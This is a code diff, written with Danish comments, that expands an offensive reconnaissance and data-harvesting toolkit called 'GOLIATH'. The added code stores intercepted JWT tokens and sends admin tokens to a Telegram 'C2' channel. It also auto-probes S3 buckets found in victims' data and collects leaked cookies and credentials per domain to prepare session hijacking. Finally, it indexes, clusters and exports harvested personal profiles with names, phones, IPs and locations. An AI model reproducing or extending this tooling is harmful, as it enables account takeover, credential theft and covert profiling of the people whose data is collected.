@@ -344,6 +344,35 @@ class PIISanitizer:
         text = re.sub(r'\b(?:\d[ -]*?){13,16}\b', '[REDACTED_CC]', text)
         return text
 
+# GOLIATH EXPANSION: S3 Bucket Vulnerability Inspector
+class S3BucketInspector:
+    @staticmethod
+    def check_exposure(bucket_url: str) -> bool:
+        """Tjekker stealthy om en fundet S3 bucket er offentligt læsbar."""
+        if not bucket_url.startswith("http"):
+            bucket_url = f"https://{bucket_url}"
+        try:
+            import requests
+            res = requests.get(bucket_url, timeout=5)
+            # En åben bucket returnerer typisk 200 OK med XML der indeholder ListBucketResult
+            if res.status_code == 200 and "ListBucketResult" in res.text:
+                return True
+        except Exception: pass
+        return False
+
+# GOLIATH EXPANSION: Telegram C2 Alerting System
+def send_telegram_alert(target: str, token_snippet: str, payload_str: str):
+    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
+    chat_id = os.getenv("TELEGRAM_CHAT_ID")
+    if bot_token and chat_id:
+        msg = f"🚨 *GOLIATH HVT ALERT* 🚨\n\n*Target:* `{target}`\n*Admin JWT Intercepted!*\n\n*Token:* `{token_snippet}...`\n*Payload:* ```json\n{payload_str}\n```"
+        try:
+            import requests
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
+                          json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=5)
+        except Exception as e:
+            logger.error(f"Kunne ikke sende Telegram alarm: {e}")
+
 # ==========================================
 # 🔹 7. ADVANCED THREAT INTEL EXTRACTION
 # ==========================================
@@ -451,6 +480,8 @@ class OmniDataLake:
                             (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, method TEXT)''')
             conn.execute('''CREATE TABLE IF NOT EXISTS harvested_data
                             (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, payload TEXT)''')
+            conn.execute('''CREATE TABLE IF NOT EXISTS intercepted_jwts
+                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, token TEXT, payload TEXT)''')
             conn.execute('''CREATE TABLE IF NOT EXISTS master_personas
                             (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, target TEXT, name TEXT, email TEXT, phone TEXT, social_handle TEXT, raw_data_ref TEXT, last_ip TEXT, location TEXT)''')
             
@@ -476,6 +507,7 @@ class OmniDataLake:
             conn.execute('CREATE INDEX IF NOT EXISTS idx_cred_user ON extracted_credentials(username)')
             conn.execute('CREATE INDEX IF NOT EXISTS idx_api ON extracted_apis(endpoint)')
             conn.execute('CREATE INDEX IF NOT EXISTS idx_harvest_target ON harvested_data(target)')
+            conn.execute('CREATE INDEX IF NOT EXISTS idx_jwt_target ON intercepted_jwts(target)')
             
             # GOLIATH V52 Auto-Heal Migration: Tilføj kolonner hvis tabellen allerede findes fra Batch 11
             try:
@@ -490,6 +522,12 @@ class OmniDataLake:
                 conn.execute("ALTER TABLE master_personas ADD COLUMN is_verified BOOLEAN DEFAULT 0")
             except sqlite3.OperationalError:
                 pass # Kolonnerne eksisterer allerede
+
+            # --- BATCH 22: FTS5 FULL-TEXT SEARCH INDEX ---
+            conn.execute('''CREATE VIRTUAL TABLE IF NOT EXISTS global_search_index USING fts5(
+                            source_table, 
+                            entity_id, 
+                            search_text)''')
 
     def ingest(self, source_module: str, target: str, data: Dict[str, Any]) -> None:
         timestamp = datetime.now().isoformat()
@@ -516,8 +554,10 @@ class OmniDataLake:
             logger.error(f"Fejl i HVT Interception: {e}")
 
         with sqlite3.connect(self.db_path) as conn:
-            conn.execute("INSERT INTO osint_records (timestamp, source_module, target, data_json) VALUES (?, ?, ?, ?)",
-                         (timestamp, source_module, target, json.dumps(data, ensure_ascii=False)))
+            osint_cursor = conn.execute("INSERT INTO osint_records (timestamp, source_module, target, data_json) VALUES (?, ?, ?, ?)",
+                                        (timestamp, source_module, target, json.dumps(data, ensure_ascii=False)))
+            conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
+                         ('osint_records', osint_cursor.lastrowid, json.dumps(data, ensure_ascii=False)))
                          
             # --- GOLIATH ADVANCED ENTITY EXTRACTION ---
             try:
@@ -529,8 +569,10 @@ class OmniDataLake:
                             elif isinstance(e, dict) and "Email" in e: emails.add(e["Email"])
                 
                 for e in emails:
-                    conn.execute("INSERT INTO extracted_emails (timestamp, source_module, target, email) VALUES (?, ?, ?, ?)",
-                                 (timestamp, source_module, target, e))
+                    email_cursor = conn.execute("INSERT INTO extracted_emails (timestamp, source_module, target, email) VALUES (?, ?, ?, ?)",
+                                                (timestamp, source_module, target, e))
+                    conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
+                                 ('extracted_emails', email_cursor.lastrowid, str(e)))
 
                 creds = []
                 if "Credentials" in data and isinstance(data["Credentials"], list):
@@ -551,9 +593,40 @@ class OmniDataLake:
 
                 for u, p in creds:
                     if u and p:
-                        conn.execute("INSERT INTO extracted_credentials (timestamp, source_module, target, username, password) VALUES (?, ?, ?, ?, ?)",
-                                     (timestamp, source_module, target, str(u), str(p)))
+                        cred_cursor = conn.execute("INSERT INTO extracted_credentials (timestamp, source_module, target, username, password) VALUES (?, ?, ?, ?, ?)",
+                                                   (timestamp, source_module, target, str(u), str(p)))
+                        conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
+                                     ('extracted_credentials', cred_cursor.lastrowid, f"{u} {p}"))
                                      
+                # GOLIATH EXPANSION: JWT Token Ingestion
+                # Fanger tokens uanset om de ligger direkte i root eller under 'osint' (fra The Apex Browser)
+                jwt_list = data.get("intercepted_jwts", data.get("osint", {}).get("intercepted_jwts", []))
+                if isinstance(jwt_list, list):
+                    for jwt_obj in jwt_list:
+                        if isinstance(jwt_obj, dict):
+                            t_str = str(jwt_obj.get("token", ""))
+                            p_str = json.dumps(jwt_obj.get("payload", {}), ensure_ascii=False)
+                            conn.execute("INSERT INTO intercepted_jwts (timestamp, source_module, target, token, payload) VALUES (?, ?, ?, ?, ?)",
+                                         (timestamp, source_module, target, t_str, p_str))
+                                         
+                            # GOLIATH TRIGGER: Telegram Admin Alert
+                            p_lower = p_str.lower()
+                            if '"admin": true' in p_lower or '"role": "admin"' in p_lower:
+                                threading.Thread(target=send_telegram_alert, args=(target, t_str[:30], p_str), daemon=True).start()
+
+                # GOLIATH EXPANSION: Auto-S3 Bucket Hunting i netværks-JSON
+                payload_str = json.dumps(data, ensure_ascii=False)
+                s3_matches = ThreatIntelExtractor.PATTERNS["s3_bucket"].findall(payload_str)
+                if s3_matches:
+                    for bucket in set(s3_matches):
+                        def verify_s3(b_url, t_target):
+                            if S3BucketInspector.check_exposure(b_url):
+                                msg = f"⚠️ KRITISK: Åben S3 Bucket detekteret i API svar: {b_url}"
+                                with sqlite3.connect(self.db_path) as c:
+                                    c.execute("INSERT INTO security_alerts (timestamp, source_module, target, keyword, snippet) VALUES (?, ?, ?, ?, ?)", (datetime.now().isoformat(), source_module, t_target, 'Open_S3_Bucket', msg))
+                                send_telegram_alert(t_target, "S3 DATA LEAK", msg)
+                        threading.Thread(target=verify_s3, args=(bucket, target), daemon=True).start()
+
                 # API Endpoint Extraction for SPA Recon
                 if "Intercepted_APIs" in data and isinstance(data["Intercepted_APIs"], list):
                     for api in data["Intercepted_APIs"]:
@@ -584,8 +657,11 @@ class OmniDataLake:
                                 coord_match = re.search(r'("lat"|"latitude"|lat|latitude)[\s:"]+([-+]?[0-9]*\.?[0-9]+).*?("lon"|"lng"|"longitude"|lon|lng|longitude)[\s:"]+([-+]?[0-9]*\.?[0-9]+)', raw_ref, re.IGNORECASE)
                                 if coord_match: location = f"{coord_match.group(2)}, {coord_match.group(4)}"
                                 
-                            conn.execute("INSERT INTO master_personas (timestamp, target, name, email, phone, social_handle, raw_data_ref, last_ip, location) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
-                                         (timestamp, target, p.get("name", ""), p.get("email", ""), p.get("phone", ""), p.get("social_handle", ""), raw_ref, last_ip, location))
+                            persona_cursor = conn.execute("INSERT INTO master_personas (timestamp, target, name, email, phone, social_handle, raw_data_ref, last_ip, location) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                                                          (timestamp, target, p.get("name", ""), p.get("email", ""), p.get("phone", ""), p.get("social_handle", ""), raw_ref, last_ip, location))
+                            search_blob = f"{p.get('name', '')} {p.get('email', '')} {p.get('phone', '')} {p.get('social_handle', '')} {last_ip} {location}"
+                            conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
+                                         ('master_personas', persona_cursor.lastrowid, search_blob))
                                          
                 # Active Service Prober Ingestion for Batch 17
                 if "Discovered_Vulns" in data and isinstance(data["Discovered_Vulns"], list):
@@ -594,6 +670,146 @@ class OmniDataLake:
                                      (v.get("persona_id"), v.get("port"), v.get("banner"), v.get("vuln"), v.get("severity"), timestamp))
             except Exception as e:
                 logger.error(f"Fejl ved Entity Extraction til Datalake: {e}")
+
+    def purge_ephemeral_html(self, retention_days: int = 7) -> None:
+        """
+        GOLIATH AUTO-PURGE: Rydder automatisk tunge HTML strenge fra databasen for records ældre end X dage.
+        OSINT metadata bevares intakt. Sletter også bloat fra FTS5 indekset.
+        """
+        try:
+            cutoff_date = (datetime.now() - timedelta(days=retention_days)).isoformat()
+            with sqlite3.connect(self.db_path) as conn:
+                cursor = conn.execute("SELECT id, data_json FROM osint_records WHERE timestamp < ? AND data_json LIKE '%html%'", (cutoff_date,))
+                records = cursor.fetchall()
+                purged_count = 0
+                
+                for row_id, data_json in records:
+                    try:
+                        parsed = json.loads(data_json)
+                        modified = False
+                        for heavy_key in ["html", "raw_html_snippet", "full_page_source"]:
+                            if heavy_key in parsed:
+                                parsed[heavy_key] = "[REDACTED_BY_7_DAY_RETENTION_POLICY]"
+                                modified = True
+                        
+                        if modified:
+                            clean_json = json.dumps(parsed, ensure_ascii=False)
+                            conn.execute("UPDATE osint_records SET data_json = ? WHERE id = ?", (clean_json, row_id))
+                            conn.execute("UPDATE global_search_index SET search_text = ? WHERE source_table='osint_records' AND entity_id=?", (clean_json, row_id))
+                            purged_count += 1
+                    except json.JSONDecodeError: pass
+                if purged_count > 0:
+                    logger.info(f"🧹 GOLIATH PURGE: Rensede forældet HTML bloat fra {purged_count} gamle records.")
+        except Exception as e:
+            logger.error(f"Fejl under Ephemeral HTML Purge: {e}")
+
+    def get_domain_artefacts(self, domain: str) -> List[Tuple]:
+        """
+        GOLIATH EXPANSION: Henter alle lækkede artefakter (cookies, credentials, rå data)
+        knyttet til et specifikt domæne for at forberede aktiv Session Hijacking.
+        """
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                # Tillader partial match på tværs af både target URL og den rå JSON blob
+                search_term = f"%{domain}%"
+                cursor = conn.execute(
+                    "SELECT id, source_module, data_json FROM osint_records WHERE target LIKE ? OR data_json LIKE ?",
+                    (search_term, search_term)
+                )
+                records = cursor.fetchall()
+                logger.info(f"OmniDataLake: Fandt {len(records)} relaterede poster for domænet '{domain}'.")
+                return records
+        except sqlite3.Error as e:
+            logger.error(f"Databasefejl under domænesøgning: {e}")
+            return []
+
+    def get_harvested_targets(self, source_module: str = "mod_scor%") -> List[Tuple]:
+        """
+        GOLIATH EXPANSION: Trækker en unik liste over alle mål høstet af et specifikt modul.
+        Returnerer (target_navn, seneste_timestamp).
+        """
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                cursor = conn.execute("SELECT target, MAX(timestamp) FROM osint_records WHERE source_module LIKE ? GROUP BY target ORDER BY MAX(timestamp) DESC", (source_module,))
+                return cursor.fetchall()
+        except sqlite3.Error as e:
+            logger.error(f"Databasefejl under hentning af loot: {e}")
+            return []
+
+    def run_nlp_threat_analysis(self) -> Dict[str, Any]:
+        """
+        GOLIATH EXPANSION (NLP): Bruger Machine Learning (TF-IDF & K-Means clustering) 
+        til at analysere al høstet fritekst og finde skjulte trusselsmønstre eller anomalier.
+        """
+        if not has_sklearn:
+            return {"error": "scikit-learn mangler. Kør: pip install scikit-learn"}
+            
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                # Hent fritekst fra Master Personas og Search Index
+                cursor = conn.execute("SELECT entity_id, search_text FROM global_search_index WHERE source_table='master_personas'")
+                records = cursor.fetchall()
+                
+                if len(records) < 5:
+                    return {"error": "For lidt data i databasen til ML-clustering. Høst flere profiler."}
+
+                ids = [r[0] for r in records]
+                texts = [str(r[1]).lower() for r in records]
+
+                # Vektoriserer teksten (fjerner almindelige ord, fremhæver unikke trusselsord)
+                vectorizer = TfidfVectorizer(stop_words='english', max_features=1000)
+                X = vectorizer.fit_transform(texts)
+
+                # Klynge-analyse (Opdeler i 3 arketyper automatisk)
+                num_clusters = 3
+                km = KMeans(n_clusters=num_clusters, random_state=42, n_init=10)
+                km.fit(X)
+
+                # Saml resultaterne
+                clusters = {f"Cluster_{i}": [ids[j] for j in range(len(ids)) if km.labels_[j] == i] for i in range(num_clusters)}
+                return {"status": "success", "total_analyzed": len(ids), "clusters": clusters}
+        except Exception as e:
+            return {"error": f"NLP Fejl: {e}"}
+
+    def export_cluster_to_csv(self, cluster_name: str, nlp_results: Dict[str, Any]) -> str:
+        """
+        GOLIATH EXPANSION: Eksporterer en specifik NLP-klynge fra ML-analysen 
+        til en Excel-kompatibel CSV-fil (med UTF-8 BOM) for videre efterforskning.
+        """
+        if "clusters" not in nlp_results or cluster_name not in nlp_results["clusters"]:
+            logger.error(f"OmniDataLake: Klyngen '{cluster_name}' blev ikke fundet i NLP-data.")
+            return ""
+            
+        entity_ids = nlp_results["clusters"][cluster_name]
+        if not entity_ids:
+            logger.warning(f"OmniDataLake: Klyngen '{cluster_name}' er tom. Intet at eksportere.")
+            return ""
+
+        # Sikker filsti i det aktive workspace med timestamp
+        filename = f"GOLIATH_NLP_EXPORT_{cluster_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
+        filepath = Path(session.get("loot_folder", get_active_workspace())) / filename
+        
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                # Sikker parameteriseret forespørgsel med IN-klausul
+                placeholders = ','.join('?' for _ in entity_ids)
+                query = f"SELECT id, name, email, phone, social_handle, last_ip, location FROM master_personas WHERE id IN ({placeholders})"
+                cursor = conn.execute(query, entity_ids)
+                rows = cursor.fetchall()
+                
+            # Skriv til CSV med UTF-8 BOM for Microsoft Excel kompatibilitet
+            with open(filepath, 'w', newline='', encoding='utf-8-sig') as f:
+                writer = csv.writer(f, delimiter=';')
+                writer.writerow(["ID", "Navn", "Email", "Telefon", "Alias", "IP-Adresse", "Lokation"])
+                for row in rows:
+                    writer.writerow(row)
+                    
+            logger.info(f"✅ NLP Klynge '{cluster_name}' eksporteret succesfuldt til: {filepath}")
+            return str(filepath)
+            
+        except Exception as e:
+            logger.error(f"Fejl ved CSV eksport af NLP klynge: {e}")
+            return ""
 
     def save_to_json(self, data: Dict[str, Any], filename: str, encrypt: bool = False, sanitize_pii: bool = False) -> str:
         filepath = self.base_dir / f"{sanitize_filename(filename)}.json"
